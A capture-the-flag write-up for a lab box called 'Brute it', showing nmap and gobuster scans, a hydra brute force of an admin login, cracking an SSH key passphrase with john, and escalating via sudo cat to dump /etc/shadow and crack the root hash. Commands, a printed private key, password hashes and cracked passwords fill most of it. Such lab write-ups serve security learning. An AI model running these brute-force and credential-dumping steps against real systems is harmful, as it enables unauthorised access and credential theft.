# ![Markdown logo](images/brute-it.jpg) Brute it
### Learn how to brute, hash cracking and escalate privileges in this box!
___
## Network scanning
### For being fast I scan without -A tag 
```
sudo nmap -p- -T4 10.10.152.68
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-10 15:07 EST
Nmap scan report for 10.10.152.68
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1091.93 seconds

```
### For more information I use -A tag and scan only port that show above
```
sudo nmap -p22,80 -A -T4 10.10.152.68
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-10 15:28 EST
Nmap scan report for 10.10.152.68
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   126.29 ms 10.9.0.1
2   123.06 ms 10.10.152.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
```
___
## Visiting  website
![Markdown logo](images/port-80.png)
### Nothing really fancy
___

## Brute force directory
```
gobuster dir -u http://10.10.152.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -t 250
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.152.68
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/10 15:35:52 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.152.68/admin/]
Progress: 1519 / 220561 (0.69%)                                                
[!] Keyboard interrupt detected, terminating.
                                                                                
===============================================================
2021/03/10 15:36:01 Finished
===============================================================

```
> Found: /admin directory
___
## Visiting /admin
![Markdown logo](images/admin.png)
___
## Looking at source code
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
```
> Found: username -> admin
___

## Tried admin:admin
![Markdown logo](images/admin_admin.png)

> Tip: Username or password invalid
___
## For using hydra we must request params
![Markdown logo](images/find_params.png)
> Tip: user & pass

___
## Brute forcing login page
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.152.68 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-10 15:49:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.152.68:80/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid
[80][http-post-form] host: 10.10.152.68   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-10 15:50:05

```
> Found: password -> xavier
___
## Login /admin page
![Markdown logo](images/admin_xavier.png)
>Found: username -> john
___

## Visiting RSA private key link
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----

```
> Found: id_rsa private ssh key 
### Saved this as id_rsa

___
## Crack key with ssh2john
```
sudo ./ssh2john.py id_rsa 
id_rsa:$sshng$1$16$E32C44CDC29375458A02E94F94B280EA$1200$2423ec7a7b726dd092c7c40c39c58a9c802c9c84444e3663cfa00b2645f79ca488e2de34cbc59f59f901883aafc4b22652b16edfefd40a65f071e5bab89ed9e42a6a305a5440df28194c5c98e74f03cf1ba44066507fef0f62bf67e2a0d2f63406f6d3cf75447295c9ca0b68f56460dccf57495b26b31a5a0049785c137c12694a02447e14b8f6d6a6f33f337c63b6ca1d84342f8de322e94d28e12af636c8f0ed5ce58530a30b5594f04d4a5cd132e12171e2756d80d6c94424df3a552da5f2f99de666d32ae4d9008e2765a25d59b70331bf00f2e3bf038f135067b791fdca109aada38f7b4178a1fd0173999434305077e61260705c734af364e9ff6796fd293ca6c2e7804b2f0153cb7b1792e5002bb3ec063d9a7572957589273702754154ec5a078bb3cd35d48cfd87f19ebc6b7e01f2d31d7a3d0c2c70b5294716aa0ca2fcc76aea5f077a89413146dc173a80bdb566f3ee838593ef738174d1bce50ef5b6ddbda923846b688f1f9c45c7b72eab7e426e1cd551f8df1975a61904e0ddfe7d1ad1f4d0d4ddfad4a146af9105ecb5f8a8a273d9c3f69bbab148f9ad64083319abd4475243bc25f3ca36cf79c591cb472e0a6a7c042f8f778b37cb76fab6a36e85aac97d9499e81d1e37df7ddba2799deec6d419b23ef3e3ef06f92ae5b5c8a1a7df60cbfc19fe6b8a117969e01cc2c3a3fe319b1789ae99ada2fc2624e5e8e68f94784537cb0afeb140497375bca1439735f4308dd357324815b297fcc3b6c679cb9c15d988d2c0e2606364e6ebe6c148ee91f54b4fd24f30df213a7b3ba27c3ef47f8560551b11e58ebbb429a86453658a0a26b5d2af3208dd8166c44f6edd41cb3aaa83508b078c771c9a7ab1cd10d27e406403a22d22ac79e7e704d1fd2c7687d7b6fcef0915816b9185681b4d26117de342f1f717db770384673043c1866f16fddcd5578f4d3d30bd6c9bbe8d2a2537dab81d7244633597ba1c076c221e06414f13d50e36f8a9f553f0534f7f5ec3cff0634435082a832eee04e27e99c1fa2c38e3d716db2e77f14f8e98ea891399b2abe53422463dcb27600c1eaeb86adf900629e8d0ef3c5ef53e088085caf38201ae0eada38b3a1e1f53aaf72bede299f743c77c12fb82b37db8eb89793bedb0f93d807a23e5ef8fb1ce48466b511c3c96afa63a208a8d04e550046af87a61e6bfae21ce1de32241d42533eb4d0ba60ead50c4522703199195a1144e6768036e387ac4465ec6a29cf439adf496c97d8a1b046ef4d950bb129c621c678998967f7035c50e12759419e417caa199342dce21281320770fcca252f5bcc516991a53909d95a2932286b49448ac666f39c0fa04a412cd8a28dfabcd3cae14ed00152d1c8d0c7c9e613a3c2f336cc746836eed6b502fbcdc3c89c1423138299de963c28fcd29fe69e78dc178db0c20395b5776e7a44015d9e4aa70be65e36feca8c8f0a025b895c3052d9a065c50df01cd0f281703d74eccd4620363839445823fcc0584eb68be9560301ea67e18a3075a025bf733c20244a43719b40457a6429a20ca00cc772b7549a6c638695e766aee71e37768e9edf1c93491ec4d9b7ec51b9738f66fe9995eb9b1b2df970d4eaec756bd4eb96e9d37092592562ab31310be0b4563f0474b6c6f6e6d3ae52be833ff1ebe7630b68b835c88191f35711f96
```
### And save it as id_rsa.hash
```
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:12 DONE (2021-03-11 06:54) 0.07763g/s 1113Kp/s 1113Kc/s 1113KC/s *7¡Vamos!
Session completed.
```
> Found: passphrase -> rockinroll

___

## Login ssh with private key
### First we need change permission of id_rsa as 600
```
chmod 600 id_rsa
```
### Now we can login ssh
```
sh john@10.10.245.151 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Mar 11 06:58:30 UTC 2021

  System load:  0.08               Processes:           102
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 24%                IP address for eth0: 10.10.245.151
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
```
___
## Find user.txt
```
ls -la
total 40
drwxr-xr-x 5 john john 4096 Sep 30 14:11 .
drwxr-xr-x 4 root root 4096 Aug 28  2020 ..
-rw------- 1 john john  394 Sep 30 14:11 .bash_history
-rw-r--r-- 1 john john  220 Aug 16  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16  2020 .bashrc
drwx------ 2 john john 4096 Aug 16  2020 .cache
drwx------ 3 john john 4096 Aug 16  2020 .gnupg
-rw-r--r-- 1 john john  807 Aug 16  2020 .profile
drwx------ 2 john john 4096 Aug 16  2020 .ssh
-rw-r--r-- 1 john john    0 Aug 16  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt
```
### Easy as you see
___
## Privilege escalation
```
sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

```
> Tip: cat sudo 
___
## Read /etc/shadow
```
sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```
> Found: root hash
___
## Crack root password
```
john hash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/john/password.lst
football         (root)
1g 0:00:00:01 DONE 2/3 (2021-03-11 07:06) 0.6134g/s 1992p/s 1992c/s 1992C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
> Found: root password -> footbal

## Or read root.txt
```
sudo cat /root/root.txt
```